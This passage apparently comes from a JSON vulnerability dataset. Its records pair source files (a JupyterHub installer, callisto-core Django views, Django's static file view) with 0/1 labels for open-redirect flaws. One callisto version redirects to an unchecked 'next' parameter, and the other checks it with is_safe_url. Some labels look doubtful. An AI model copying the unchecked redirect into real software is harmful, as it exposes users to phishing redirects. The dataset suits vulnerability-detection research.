BqDXjmSQu66mDKwU5Ek\nfNlbyrpzZMyFCDWEYo4AIR/18aGZBYUAEQEAAYkCHwQYAQIACQUCU5sktgIbDAAK\nCRAWVaCraFdigIPQEACcYh8rR19wMZZ/hgYv5so6Y1HcJNARuzmffQKozS/rxqec\n0xM3wceL1AIMuGhlXFeGd0wRv/RVzeZjnTGwhN1DnCDy1I66hUTgehONsfVanuP1\nPZKoL38EAxsMzdYgkYH6T9a4wJH/IPt+uuFTFFy3o8TKMvKaJk98+Jsp2X/QuNxh\nqpcIGaVbtQ1bn7m+k5Qe/fz+bFuUeXPivafLLlGc6KbdgMvSW9EVMO7yBy/2JE15\nZJgl7lXKLQ31VQPAHT3an5IV2C/ie12eEqZWlnCiHV/wT+zhOkSpWdrheWfBT+ac\nhR4jDH80AS3F8jo3byQATJb3RoCYUCVc3u1ouhNZa5yLgYZ/iZkpk5gKjxHPudFb\nDdWjbGflN9k17VCf4Z9yAb9QMqHzHwIGXrb7ryFcuROMCLLVUp07PrTrRxnO9A/4\nxxECi0l/BzNxeU1gK88hEaNjIfviPR/h6Gq6KOcNKZ8rVFdwFpjbvwHMQBWhrqfu\nG3KaePvbnObKHXpfIKoAM7X2qfO+IFnLGTPyhFTcrl6vZBTMZTfZiC1XDQLuGUnd\nsckuXINIU3DFWzZGr0QrqkuE/jyr7FXeUJj9B7cLo+s/TXo+RaVfi3kOc9BoxIvy\n/qiNGs/TKy2/Ujqp/affmIMoMXSozKmga81JSwkADO1JMgUy6dApXz9kP4EE3g==\n=CLGF\n-----END PGP PUBLIC KEY BLOCK-----\n    \"\"\".strip()\n    apt.trust_gpg_key(key)\n    apt.add_source('nodesource', 'https://deb.nodesource.com/node_10.x', 'main')\n    apt.install_packages(['nodejs'])\n\ndef remove_chp():\n    \"\"\"\n    Ensure CHP is not running\n    \"\"\"\n    if os.path.exists(\"/etc/systemd/system/configurable-http-proxy.service\"):\n        if systemd.check_service_active('configurable-http-proxy.service'):\n            try:\n                systemd.stop_service('configurable-http-proxy.service')\n            except subprocess.CalledProcessError:\n                logger.info(\"Cannot stop configurable-http-proxy...\")\n        if systemd.check_service_enabled('configurable-http-proxy.service'):\n            try:\n                systemd.disable_service('configurable-http-proxy.service')\n            except subprocess.CalledProcessError:\n                logger.info(\"Cannot disable configurable-http-proxy...\")\n        try:\n            systemd.uninstall_unit('configurable-http-proxy.service')\n        except subprocess.CalledProcessError:\n            logger.info(\"Cannot uninstall configurable-http-proxy...\")\n\n\ndef ensure_jupyterhub_service(prefix):\n    \"\"\"\n    Ensure JupyterHub Services are set up properly\n    \"\"\"\n\n    os.makedirs(STATE_DIR, mode=0o700, exist_ok=True)\n\n    remove_chp()\n    systemd.reload_daemon()\n\n    with open(os.path.join(HERE, 'systemd-units', 'jupyterhub.service')) as f:\n        hub_unit_template = f.read()\n\n\n    with open(os.path.join(HERE, 'systemd-units', 'traefik.service')) as f:\n        traefik_unit_template = f.read()\n\n    #Set up proxy / hub secret token if it is not already setup\n    proxy_secret_path = os.path.join(STATE_DIR, 'traefik-api.secret')\n    if not os.path.exists(proxy_secret_path):\n        with open(proxy_secret_path, 'w') as f:\n            f.write(secrets.token_hex(32))\n\n    traefik.ensure_traefik_config(STATE_DIR)\n\n    unit_params = dict(\n        python_interpreter_path=sys.executable,\n        jupyterhub_config_path=os.path.join(HERE, 'jupyterhub_config.py'),\n        install_prefix=INSTALL_PREFIX,\n    )\n    systemd.install_unit('jupyterhub.service', hub_unit_template.format(**unit_params))\n    systemd.install_unit('traefik.service', traefik_unit_template.format(**unit_params))\n    systemd.reload_daemon()\n\n    # If JupyterHub is running, we want to restart it.\n    systemd.restart_service('jupyterhub')\n    systemd.restart_service('traefik')\n\n    # Mark JupyterHub & traefik to start at boot time\n    systemd.enable_service('jupyterhub')\n    systemd.enable_service('traefik')\n\n\ndef ensure_jupyterlab_extensions():\n    \"\"\"\n    Install the JupyterLab extensions we want.\n    \"\"\"\n    extensions = [\n        '@jupyterlab/hub-extension',\n        '@jupyter-widgets/jupyterlab-manager'\n    ]\n    subprocess.check_output([\n        os.path.join(USER_ENV_PREFIX, 'bin/jupyter'),\n        'labextension',\n        'install'\n    ] + extensions)\n\n\ndef ensure_jupyterhub_package(prefix):\n    \"\"\"\n    Install JupyterHub into our conda environment if needed.\n\n    We install all python packages from PyPI as much as possible in the\n    hub environment. A lot of spawners & authenticators do not have conda-forge\n    packages, but do have pip packages. Keeping all python packages in the\n    hub environment be installed with pip prevents accidental mixing of python\n    and conda packages!\n    \"\"\"\n    conda.ensure_pip_packages(prefix, [\n        'jupyterhub==0.9.4',\n        'jupyterhub-dummyauthenticator==0.3.1',\n        'jupyterhub-systemdspawner==0.11',\n        'jupyterhub-firstuseauthenticator==0.12',\n        'jupyterhub-nativeauthenticator==0.0.4',\n        'jupyterhub-ldapauthenticator==1.2.2',\n        'oauthenticator==0.8.0'\n    ])\n    traefik.ensure_traefik_binary(prefix)\n\n\ndef ensure_usergroups():\n    \"\"\"\n    Sets up user groups & sudo rules\n    \"\"\"\n    user.ensure_group('jupyterhub-admins')\n    user.ensure_group('jupyterhub-users')\n\n    logger.info(\"Granting passwordless sudo to JupyterHub admins...\")\n    with open('/etc/sudoers.d/jupyterhub-admins', 'w') as f:\n        # JupyterHub admins should have full passwordless sudo access\n        f.write('%jupyterhub-admins ALL = (ALL) NOPASSWD: ALL\\n')\n        # `sudo -E` should preserve the $PATH we set. This allows\n        # admins in jupyter terminals to do `sudo -E pip install <package>`,\n        # `pip` is in the $PATH we set in jupyterhub_config.py to include the user conda env.\n        f.write('Defaults exempt_group = jupyterhub-admins\\n')\n\n\ndef ensure_user_environment(user_requirements_txt_file):\n    \"\"\"\n    Set up user conda environment with required packages\n    \"\"\"\n    logger.info(\"Setting up user environment...\")\n    miniconda_version = '4.5.4'\n    miniconda_installer_md5 = \"a946ea1d0c4a642ddf0c3a26a18bb16d\"\n\n    if not conda.check_miniconda_version(USER_ENV_PREFIX, miniconda_version):\n        logger.info('Downloading & setting up user environment...')\n        with conda.download_miniconda_installer(miniconda_version, miniconda_installer_md5) as installer_path:\n            conda.install_miniconda(installer_path, USER_ENV_PREFIX)\n\n    # nbresuse needs psutil, which requires gcc\n    apt.install_packages([\n        'gcc'\n    ])\n\n    conda.ensure_conda_packages(USER_ENV_PREFIX, [\n        # Conda's latest version is on conda much more so than on PyPI.\n        'conda==4.5.8'\n    ])\n\n    conda.ensure_pip_packages(USER_ENV_PREFIX, [\n        # JupyterHub + notebook package are base requirements for user environment\n        'jupyterhub==0.9.4',\n        'notebook==5.7.0',\n        # Install additional notebook frontends!\n        'jupyterlab==0.35.3',\n        'nteract-on-jupyter==1.9.12',\n        # nbgitpuller for easily pulling in Git repositories\n        'nbgitpuller==0.6.1',\n        # nbresuse to show people how much RAM they are using\n        'nbresuse==0.3.0',\n        # Most people consider ipywidgets to be part of the core notebook experience\n        'ipywidgets==7.4.2',\n        # Pin tornado\n        'tornado<6.0'\n    ])\n\n    if user_requirements_txt_file:\n        # FIXME: This currently fails hard, should fail soft and not abort installer\n        conda.ensure_pip_requirements(USER_ENV_PREFIX, user_requirements_txt_file)\n\n\ndef ensure_admins(admins):\n    \"\"\"\n    Setup given list of users as admins.\n    \"\"\"\n    if not admins:\n        return\n    logger.info(\"Setting up admin users\")\n    config_path = CONFIG_FILE\n    if os.path.exists(config_path):\n        with open(config_path, 'r') as f:\n            config = yaml.load(f)\n    else:\n        config = {}\n\n    config['users'] = config.get('users', {})\n    config['users']['admin'] = list(admins)\n\n    with open(config_path, 'w+') as f:\n        yaml.dump(config, f)\n\n\ndef ensure_jupyterhub_running(times=20):\n    \"\"\"\n    Ensure that JupyterHub is up and running\n\n    Loops given number of times, waiting a second each.\n    \"\"\"\n\n    for i in range(times):\n        try:\n            logger.info('Waiting for JupyterHub to come up ({}/{} tries)'.format(i + 1, times))\n            urlopen('http://127.0.0.1')\n            return\n        except HTTPError as h:\n            if h.code in [404, 502, 503]:\n                # May be transient\n                time.sleep(1)\n                continue\n            # Everything else should immediately abort\n            raise\n        except URLError as e:\n            if isinstance(e.reason, ConnectionRefusedError):\n                # Hub isn't up yet, sleep & loop\n                time.sleep(1)\n                continue\n            # Everything else should immediately abort\n            raise\n\n    raise Exception(\"Installation failed: JupyterHub did not start in {}s\".format(times))\n\n\ndef ensure_symlinks(prefix):\n    \"\"\"\n    Ensure we symlink appropriate things into /usr/bin\n\n    We add the user conda environment to PATH for notebook terminals,\n    but not the hub venv. This means tljh-config is not actually accessible.\n\n    We symlink to /usr/bin and not /usr/local/bin, since /usr/local/bin is\n    not place, and works with sudo -E in sudo's search $PATH. We can work\n    around this with sudo -E and extra entries in the sudoers file, but this\n    is far more secure at the cost of upsetting some FHS purists.\n    \"\"\"\n    tljh_config_src = os.path.join(prefix, 'bin', 'tljh-config')\n    tljh_config_dest = '/usr/bin/tljh-config'\n    if os.path.exists(tljh_config_dest):\n        if os.path.realpath(tljh_config_dest) != tljh_config_src:\n            #  tljh-config exists that isn't ours. We should *not* delete this file,\n            # instead we throw an error and abort. Deleting files owned by other people\n            # while running as root is dangerous, especially with symlinks involved.\n            raise FileExistsError(f'/usr/bin/tljh-config exists but is not a symlink to {tljh_config_src}')\n        else:\n            # We have a working symlink, so do nothing\n            return\n    os.symlink(tljh_config_src, tljh_config_dest)\n\n\ndef setup_plugins(plugins=None):\n    \"\"\"\n    Install plugins & setup a pluginmanager\n    \"\"\"\n    # Install plugins\n    if plugins:\n        conda.ensure_pip_packages(HUB_ENV_PREFIX, plugins)\n\n    # Set up plugin infrastructure\n    pm = pluggy.PluginManager('tljh')\n    pm.add_hookspecs(hooks)\n    pm.load_setuptools_entrypoints('tljh')\n\n    return pm\n\n\ndef run_plugin_actions(plugin_manager, plugins):\n    \"\"\"\n    Run installer hooks defined in plugins\n    \"\"\"\n    hook = plugin_manager.hook\n    # Install apt packages\n    apt_packages = list(set(itertools.chain(*hook.tljh_extra_apt_packages())))\n    if apt_packages:\n        logger.info('Installing {} apt packages collected from plugins: {}'.format(\n            len(apt_packages), ' '.join(apt_packages)\n        ))\n        apt.install_packages(apt_packages)\n\n    # Install conda packages\n    conda_packages = list(set(itertools.chain(*hook.tljh_extra_user_conda_packages())))\n    if conda_packages:\n        logger.info('Installing {} conda packages collected from plugins: {}'.format(\n            len(conda_packages), ' '.join(conda_packages)\n        ))\n        conda.ensure_conda_packages(USER_ENV_PREFIX, conda_packages)\n\n    # Install pip packages\n    pip_packages = list(set(itertools.chain(*hook.tljh_extra_user_pip_packages())))\n    if pip_packages:\n        logger.info('Installing {} pip packages collected from plugins: {}'.format(\n            len(pip_packages), ' '.join(pip_packages)\n        ))\n        conda.ensure_pip_packages(USER_ENV_PREFIX, pip_packages)\n\n\ndef ensure_config_yaml(plugin_manager):\n    \"\"\"\n    Ensure we have a config.yaml present\n    \"\"\"\n    # ensure config dir exists and is private\n    for path in [CONFIG_DIR, os.path.join(CONFIG_DIR, 'jupyterhub_config.d')]:\n        os.makedirs(path, mode=0o700, exist_ok=True)\n\n    migrator.migrate_config_files()\n\n    if os.path.exists(CONFIG_FILE):\n        with open(CONFIG_FILE, 'r') as f:\n            config = yaml.load(f)\n    else:\n        config = {}\n\n    hook = plugin_manager.hook\n    hook.tljh_config_post_install(config=config)\n\n    with open(CONFIG_FILE, 'w+') as f:\n        yaml.dump(config, f)\n\n\ndef main():\n    from .log import init_logging\n    init_logging()\n\n    argparser = argparse.ArgumentParser()\n    argparser.add_argument(\n        '--admin',\n        nargs='*',\n        help='List of usernames set to be admin'\n    )\n    argparser.add_argument(\n        '--user-requirements-txt-url',\n        help='URL to a requirements.txt file that should be installed in the user enviornment'\n    )\n    argparser.add_argument(\n        '--plugin',\n        nargs='*',\n        help='Plugin pip-specs to install'\n    )\n\n    args = argparser.parse_args()\n\n    pm = setup_plugins(args.plugin)\n\n    ensure_config_yaml(pm)\n    ensure_admins(args.admin)\n    ensure_usergroups()\n    ensure_user_environment(args.user_requirements_txt_url)\n\n    logger.info(\"Setting up JupyterHub...\")\n    ensure_node()\n    ensure_jupyterhub_package(HUB_ENV_PREFIX)\n    ensure_jupyterlab_extensions()\n    ensure_jupyterhub_service(HUB_ENV_PREFIX)\n    ensure_jupyterhub_running()\n    ensure_symlinks(HUB_ENV_PREFIX)\n\n    # Run installer plugins last\n    run_plugin_actions(pm, args.plugin)\n\n    logger.info(\"Done!\")\n\n\nif __name__ == '__main__':\n    main()\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "76755bbf0ffaf425f481f18ab2f5cda23581bcad", "code": "callisto_core/delivery/view_partials.py/n/n\"\"\"\n\nView partials provide all the callisto-core front-end functionality.\nSubclass these partials with your own views if you are implementing\ncallisto-core. Many of the view partials only provide a subset of the\nfunctionality required for a full HTML view.\n\ndocs / reference:\n    - https://docs.djangoproject.com/en/1.11/topics/class-based-views/\n    - https://github.com/project-callisto/callisto-core/blob/master/callisto_core/wizard_builder/view_partials.py\n\nview_partials should define:\n    - forms\n    - models\n    - helper classes\n    - access checks\n    - redirect handlers\n\nand should not define:\n    - templates\n    - url names\n\n\"\"\"\nimport logging\nimport re\n\nimport ratelimit.mixins\nfrom nacl.exceptions import CryptoError\n\nfrom django.conf import settings\nfrom django.core.exceptions import PermissionDenied\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.urls import reverse, reverse_lazy\nfrom django.views import generic as views\nfrom django.utils.http import is_safe_url\n\nfrom callisto_core.evaluation.view_partials import EvalDataMixin\nfrom callisto_core.reporting import report_delivery\nfrom callisto_core.wizard_builder import (\n    data_helper,\n    view_partials as wizard_builder_partials,\n)\n\nfrom . import forms, models, view_helpers\n\nlogger = logging.getLogger(__name__)\n\n\n#######################\n# secret key partials #\n#######################\n\n\nclass _PassphrasePartial(views.base.TemplateView):\n    storage_helper = view_helpers.ReportStorageHelper\n\n    @property\n    def storage(self):\n        return self.storage_helper(self)\n\n\nclass _PassphraseClearingPartial(EvalDataMixin, _PassphrasePartial):\n    def get(self, request, *args, **kwargs):\n        self.storage.clear_passphrases()\n        return super().get(request, *args, **kwargs)\n\n\nclass DashboardPartial(_PassphraseClearingPartial):\n    EVAL_ACTION_TYPE = \"DASHBOARD\"\n\n\n###################\n# report partials #\n###################\n\n\nclass ReportBasePartial(EvalDataMixin, wizard_builder_partials.WizardFormPartial):\n    model = models.Report\n    storage_helper = view_helpers.EncryptedReportStorageHelper\n    EVAL_ACTION_TYPE = \"VIEW\"\n\n    @property\n    def site_id(self):\n        # TODO: remove\n        return self.request.site.id\n\n    @property\n    def decrypted_report(self):\n        return self.report.decrypt_record(self.storage.passphrase)\n\n    def get_form_kwargs(self):\n        kwargs = super().get_form_kwargs()\n        kwargs.update({\"view\": self})  # TODO: remove\n        return kwargs\n\n\nclass ReportCreatePartial(ReportBasePartial, views.edit.CreateView):\n    form_class = forms.ReportCreateForm\n    EVAL_ACTION_TYPE = \"CREATE\"\n\n    def get_success_url(self):\n        return reverse(self.success_url, kwargs={\"step\": 0, \"uuid\": self.object.uuid})\n\n\nclass _ReportDetailPartial(ReportBasePartial, views.detail.DetailView):\n    context_object_name = \"report\"\n    slug_field = \"uuid\"\n    slug_url_kwarg = \"uuid\"\n\n    @property\n    def report(self):\n        # TODO: remove, use self.object\n        return self.get_object()\n\n\nclass _ReportLimitedDetailPartial(\n    _ReportDetailPartial, ratelimit.mixins.RatelimitMixin\n):\n    ratelimit_key = \"user\"\n    ratelimit_rate = settings.DECRYPT_THROTTLE_RATE\n\n\nclass _ReportAccessPartial(_ReportLimitedDetailPartial):\n    invalid_access_key_message = \"Invalid key in access request\"\n    invalid_access_user_message = \"Invalid user in access request\"\n    invalid_access_no_key_message = \"No key in access request\"\n    form_class = forms.ReportAccessForm\n    access_form_class = forms.ReportAccessForm\n\n    @property\n    def access_granted(self):\n        self._check_report_owner()\n        try:\n            passphrase = self.request.POST[\"key\"]\n        except Exception:\n            return False\n\n        if passphrase:\n            try:\n                self.storage.report.decrypt_record(passphrase)\n                return True\n            except CryptoError:\n                logger.warn(self.invalid_access_key_message)\n                return False\n        else:\n            logger.info(self.invalid_access_no_key_message)\n            return False\n\n    @property\n    def access_form_valid(self):\n        form = self._get_access_form()\n        if form.is_valid():\n            form.save()\n            return True\n        else:\n            return False\n\n    def _passphrase_next_url(self, request):\n        next_url = None\n        if \"next\" in request.GET:\n            if re.search(r\"^/[\\W/-]*\", request.GET[\"next\"]):\n                if is_safe_url(request.GET[\"next\"]):\n                    next_url = request.GET[\"next\"]\n        return next_url\n\n    def dispatch(self, request, *args, **kwargs):\n        logger.debug(f\"{self.__class__.__name__} access check\")\n\n        if (\n            self.access_granted or self.access_form_valid\n        ) and self._passphrase_next_url(request):\n            return self._redirect_from_passphrase(request)\n        elif self.access_granted or self.access_form_valid:\n            return super().dispatch(request, *args, **kwargs)\n        else:\n            return self._render_access_form()\n\n    def _get_access_form(self):\n        form_kwargs = self.get_form_kwargs()\n        form_kwargs.update({\"instance\": self.get_object()})\n        return self.access_form_class(**form_kwargs)\n\n    def _render_access_form(self):\n        self.object = self.report\n        self.template_name = self.access_template_name\n        context = self.get_context_data(form=self._get_access_form())\n        return self.render_to_response(context)\n\n    def _redirect_from_passphrase(self, request):\n        return redirect(self._passphrase_next_url(request))\n\n    def _check_report_owner(self):\n        if not self.report.owner == self.request.user:\n            logger.warn(self.invalid_access_user_message)\n            raise PermissionDenied\n\n\nclass _ReportUpdatePartial(_ReportAccessPartial, views.edit.UpdateView):\n    back_url = None\n\n    @property\n    def report(self):\n        # TODO: remove, use self.object\n        return self.get_object()\n\n\n###################\n# wizard partials #\n###################\n\n\nclass EncryptedWizardPartial(\n    _ReportUpdatePartial, wizard_builder_partials.WizardPartial\n):\n    steps_helper = view_helpers.ReportStepsHelper\n    EVAL_ACTION_TYPE = \"EDIT\"\n\n    def dispatch(self, request, *args, **kwargs):\n        self._dispatch_processing()\n        return super().dispatch(request, *args, **kwargs)\n\n    def _rendering_done_hook(self):\n        self.eval_action(\"REVIEW\")\n\n\n###################\n# report actions  #\n###################\n\n\nclass _ReportActionPartial(_ReportUpdatePartial):\n    success_url = reverse_lazy(\"dashboard\")\n\n    def form_valid(self, form):\n        logger.debug(f\"{self.__class__.__name__} form valid\")\n        output = super().form_valid(form)\n        self.view_action()\n        return output\n\n    def form_invalid(self, form):\n        return super().form_invalid(form)\n\n    def view_action(self):\n        pass\n\n\nclass ReportDeletePartial(_ReportActionPartial):\n    EVAL_ACTION_TYPE = \"DELETE\"\n\n    def view_action(self):\n        self.report.delete()\n\n\nclass WizardPDFPartial(_ReportActionPartial):\n    EVAL_ACTION_TYPE = \"ACCESS_PDF\"\n\n    def form_valid(self, form):\n        # remove the old PDF generator completely.\n        # this should be generated via JS now.\n        pass\n\n\nclass ViewPDFPartial(WizardPDFPartial):\n    content_disposition = \"inline\"\n    EVAL_ACTION_TYPE = \"VIEW_PDF\"\n\n\nclass DownloadPDFPartial(WizardPDFPartial):\n    content_disposition = \"attachment\"\n    EVAL_ACTION_TYPE = \"DOWNLOAD_PDF\"\n/n/n/n", "label": 0, "vtype": "open_redirect"}, {"id": "76755bbf0ffaf425f481f18ab2f5cda23581bcad", "code": "/callisto_core/delivery/view_partials.py/n/n\"\"\"\n\nView partials provide all the callisto-core front-end functionality.\nSubclass these partials with your own views if you are implementing\ncallisto-core. Many of the view partials only provide a subset of the\nfunctionality required for a full HTML view.\n\ndocs / reference:\n    - https://docs.djangoproject.com/en/1.11/topics/class-based-views/\n    - https://github.com/project-callisto/callisto-core/blob/master/callisto_core/wizard_builder/view_partials.py\n\nview_partials should define:\n    - forms\n    - models\n    - helper classes\n    - access checks\n    - redirect handlers\n\nand should not define:\n    - templates\n    - url names\n\n\"\"\"\nimport logging\nimport re\n\nimport ratelimit.mixins\nfrom nacl.exceptions import CryptoError\n\nfrom django.conf import settings\nfrom django.core.exceptions import PermissionDenied\nfrom django.http import HttpResponse\nfrom django.shortcuts import redirect\nfrom django.urls import reverse, reverse_lazy\nfrom django.views import generic as views\n\nfrom callisto_core.evaluation.view_partials import EvalDataMixin\nfrom callisto_core.reporting import report_delivery\nfrom callisto_core.wizard_builder import (\n    data_helper,\n    view_partials as wizard_builder_partials,\n)\n\nfrom . import forms, models, view_helpers\n\nlogger = logging.getLogger(__name__)\n\n\n#######################\n# secret key partials #\n#######################\n\n\nclass _PassphrasePartial(views.base.TemplateView):\n    storage_helper = view_helpers.ReportStorageHelper\n\n    @property\n    def storage(self):\n        return self.storage_helper(self)\n\n\nclass _PassphraseClearingPartial(EvalDataMixin, _PassphrasePartial):\n    def get(self, request, *args, **kwargs):\n        self.storage.clear_passphrases()\n        return super().get(request, *args, **kwargs)\n\n\nclass DashboardPartial(_PassphraseClearingPartial):\n    EVAL_ACTION_TYPE = \"DASHBOARD\"\n\n\n###################\n# report partials #\n###################\n\n\nclass ReportBasePartial(EvalDataMixin, wizard_builder_partials.WizardFormPartial):\n    model = models.Report\n    storage_helper = view_helpers.EncryptedReportStorageHelper\n    EVAL_ACTION_TYPE = \"VIEW\"\n\n    @property\n    def site_id(self):\n        # TODO: remove\n        return self.request.site.id\n\n    @property\n    def decrypted_report(self):\n        return self.report.decrypt_record(self.storage.passphrase)\n\n    def get_form_kwargs(self):\n        kwargs = super().get_form_kwargs()\n        kwargs.update({\"view\": self})  # TODO: remove\n        return kwargs\n\n\nclass ReportCreatePartial(ReportBasePartial, views.edit.CreateView):\n    form_class = forms.ReportCreateForm\n    EVAL_ACTION_TYPE = \"CREATE\"\n\n    def get_success_url(self):\n        return reverse(self.success_url, kwargs={\"step\": 0, \"uuid\": self.object.uuid})\n\n\nclass _ReportDetailPartial(ReportBasePartial, views.detail.DetailView):\n    context_object_name = \"report\"\n    slug_field = \"uuid\"\n    slug_url_kwarg = \"uuid\"\n\n    @property\n    def report(self):\n        # TODO: remove, use self.object\n        return self.get_object()\n\n\nclass _ReportLimitedDetailPartial(\n    _ReportDetailPartial, ratelimit.mixins.RatelimitMixin\n):\n    ratelimit_key = \"user\"\n    ratelimit_rate = settings.DECRYPT_THROTTLE_RATE\n\n\nclass _ReportAccessPartial(_ReportLimitedDetailPartial):\n    invalid_access_key_message = \"Invalid key in access request\"\n    invalid_access_user_message = \"Invalid user in access request\"\n    invalid_access_no_key_message = \"No key in access request\"\n    form_class = forms.ReportAccessForm\n    access_form_class = forms.ReportAccessForm\n\n    @property\n    def access_granted(self):\n        self._check_report_owner()\n        try:\n            passphrase = self.request.POST[\"key\"]\n        except Exception:\n            return False\n\n        if passphrase:\n            try:\n                self.storage.report.decrypt_record(passphrase)\n                return True\n            except CryptoError:\n                logger.warn(self.invalid_access_key_message)\n                return False\n        else:\n            logger.info(self.invalid_access_no_key_message)\n            return False\n\n    @property\n    def access_form_valid(self):\n        form = self._get_access_form()\n        if form.is_valid():\n            form.save()\n            return True\n        else:\n            return False\n\n    def _passphrase_next_url(self, request):\n        next_url = None\n        if \"next\" in request.GET:\n            if re.search(r\"^/[\\W/-]*\", request.GET[\"next\"]):\n                next_url = request.GET[\"next\"]\n        return next_url\n\n    def dispatch(self, request, *args, **kwargs):\n        logger.debug(f\"{self.__class__.__name__} access check\")\n\n        if (\n            self.access_granted or self.access_form_valid\n        ) and self._passphrase_next_url(request):\n            return self._redirect_from_passphrase(request)\n        elif self.access_granted or self.access_form_valid:\n            return super().dispatch(request, *args, **kwargs)\n        else:\n            return self._render_access_form()\n\n    def _get_access_form(self):\n        form_kwargs = self.get_form_kwargs()\n        form_kwargs.update({\"instance\": self.get_object()})\n        return self.access_form_class(**form_kwargs)\n\n    def _render_access_form(self):\n        self.object = self.report\n        self.template_name = self.access_template_name\n        context = self.get_context_data(form=self._get_access_form())\n        return self.render_to_response(context)\n\n    def _redirect_from_passphrase(self, request):\n        return redirect(self._passphrase_next_url(request))\n\n    def _check_report_owner(self):\n        if not self.report.owner == self.request.user:\n            logger.warn(self.invalid_access_user_message)\n            raise PermissionDenied\n\n\nclass _ReportUpdatePartial(_ReportAccessPartial, views.edit.UpdateView):\n    back_url = None\n\n    @property\n    def report(self):\n        # TODO: remove, use self.object\n        return self.get_object()\n\n\n###################\n# wizard partials #\n###################\n\n\nclass EncryptedWizardPartial(\n    _ReportUpdatePartial, wizard_builder_partials.WizardPartial\n):\n    steps_helper = view_helpers.ReportStepsHelper\n    EVAL_ACTION_TYPE = \"EDIT\"\n\n    def dispatch(self, request, *args, **kwargs):\n        self._dispatch_processing()\n        return super().dispatch(request, *args, **kwargs)\n\n    def _rendering_done_hook(self):\n        self.eval_action(\"REVIEW\")\n\n\n###################\n# report actions  #\n###################\n\n\nclass _ReportActionPartial(_ReportUpdatePartial):\n    success_url = reverse_lazy(\"dashboard\")\n\n    def form_valid(self, form):\n        logger.debug(f\"{self.__class__.__name__} form valid\")\n        output = super().form_valid(form)\n        self.view_action()\n        return output\n\n    def form_invalid(self, form):\n        return super().form_invalid(form)\n\n    def view_action(self):\n        pass\n\n\nclass ReportDeletePartial(_ReportActionPartial):\n    EVAL_ACTION_TYPE = \"DELETE\"\n\n    def view_action(self):\n        self.report.delete()\n\n\nclass WizardPDFPartial(_ReportActionPartial):\n    EVAL_ACTION_TYPE = \"ACCESS_PDF\"\n\n    def form_valid(self, form):\n        # remove the old PDF generator completely.\n        # this should be generated via JS now.\n        pass\n\n\nclass ViewPDFPartial(WizardPDFPartial):\n    content_disposition = \"inline\"\n    EVAL_ACTION_TYPE = \"VIEW_PDF\"\n\n\nclass DownloadPDFPartial(WizardPDFPartial):\n    content_disposition = \"attachment\"\n    EVAL_ACTION_TYPE = \"DOWNLOAD_PDF\"\n/n/n/n", "label": 1, "vtype": "open_redirect"}, {"id": "a1f948b468b6621083a03b0d53432341b7a4d753", "code": "django/views/static.py/n/n\"\"\"\nViews and functions for serving static files. These are only to be used\nduring development, and SHOULD NOT be used in a production setting.\n\"\"\"\nimport mimetypes\nimport os\nimport posixpath\nimport re\nimport stat\n\nfrom django.http import (\n    FileResponse, Http404, HttpResponse, HttpResponseNotModified,\n)\nfrom django.template import Context, Engine, TemplateDoesNotExist, loader\nfrom django.utils._os import safe_join\nfrom django.utils.http import http_date, parse_http_date\nfrom django.utils.translation import gettext as _, gettext_lazy\n\n\ndef serve(request, path, document_root=None, show_indexes=False):\n    \"\"\"\n    Serve static files below a given point in the directory structure.\n\n    To use, put a URL pattern such as::\n\n        from django.views.static import serve\n\n        url(r'^(?P<path>.*)$', serve, {'document_root': '/path/to/my/files/'})\n\n    in your URLconf. You must provide the ``document_root`` param. You may\n    also set ``show_indexes`` to ``True`` if you'd like to serve a basic index\n    of the directory.  This index view will use the template hardcoded below,\n    but if you'd like to override it, you can create a template called\n    ``static/directory_index.html``.\n    \"\"\"\n    path = posixpath.normpath(path).lstrip('/')\n    fullpath = safe_join(document_root, path)\n    if os.path.isdir(fullpath):\n        if show_indexes:\n            return directory_index(path, fullpath)\n        raise Http404(_(\"Directory indexes are not allowed here.\"))\n    if not os.path.exists(fullpath):\n        raise Http404(_('\"%(path)s\" does not exist') % {'path': fullpath})\n    # Respect the If-Modified-Since header.\n    statobj = os.stat(fullpath)\n    if not was_modified_since(request.META.get('HTTP_IF_MODIFIED_SINCE'),\n                              statobj.st_mtime, statobj.st_size):\n        return HttpResponseNotModified()\n    content_type, encoding = mimetypes.guess_type(fullpath)\n    content_type = content_type or 'application/octet-stream'\n    response = FileResponse(open(fullpath, 'rb'), content_type=content_type)\n    response[\"Last-Modified\"] = http_date(statobj.st_mtime)\n    if stat.S_ISREG(statobj.st_mode):\n        response[\"Content-Length\"] = statobj.st_size\n    if encoding:\n        response[\"Content-Encoding\"] = encoding\n    return response\n\n\nDEFAULT_DIRECTORY_INDEX_TEMPLATE = \"\"\"\n{% load i18n %}\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta http-equiv=\"Content-Language\" content=\"en-us\" />\n    <meta name=\"robots\" content=\"NONE,NOARCHIVE\" />\n    <title>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</title>\n  </head>\n  <body>\n    <h1>{% blocktrans %}Index of {{ directory }}{% endblocktrans %}</h1>\n    <ul>\n      {% if directory != \"/\" %}\n      <li><a href=\"../\">../</a></li>\n      {% endif %}\n      {% for f in file_list %}\n      <li><a href=\"{{ f|urlencode }}\">{{ f }}</a></li>\n      {% endfor %}\n    </ul>\n  </body>\n</html>\n\"\"\"\ntemplate_translatable = gettext_lazy(\"Index of %(directory)s\")\n\n\ndef directory_index(path, fullpath):\n    try:\n        t = loader.select_template([\n            'static/directory_index.html',\n            'static/directory_index',\n        ])\n    except TemplateDoesNotExist:\n        t = Engine(libraries={'i18n': 'django.templatetags.i18n'}).from_string(DEFAULT_DIRECTORY_INDEX_TEMPLATE)\n    files = []\n    for f in os.listdir(fullpath):\n        if not f.startswith('.'):\n            if os.path.isdir(os.path.join(fullpath, f)):\n                f += '/'\n            files.append(f)\n    c = Context({\n        'directory': path + '/',\n        'file_list': files,\n    })\n    return HttpResponse(t.render(c))\n\n\ndef was_modified_since(header=None, mtime=0, size=0):\n    \"\"\"\n    Was something modified since the user last downloaded it?\n\n    header\n      This is the value of the If-Modified-Since header.  If this is None,\n      I'll just return True.\n\n    mtime\n      This is the modification time of the item we're talking about.\n\n    size\n      This is the size of the item we're talking about.\n    \"\"\"\n    try:\n        if header is None:\n            raise ValueError\n        matches = re.match(r\"^([^;]+)(; length=([0-9]+))?$\", header,\n                           re.IGNORECASE)\n        header_mtime = parse_http_date(matches.group(1))\n        header_len = matches.group(3)\n        if header_len and int(header_len) != size:\n            raise ValueError\n        if int(mtime) > 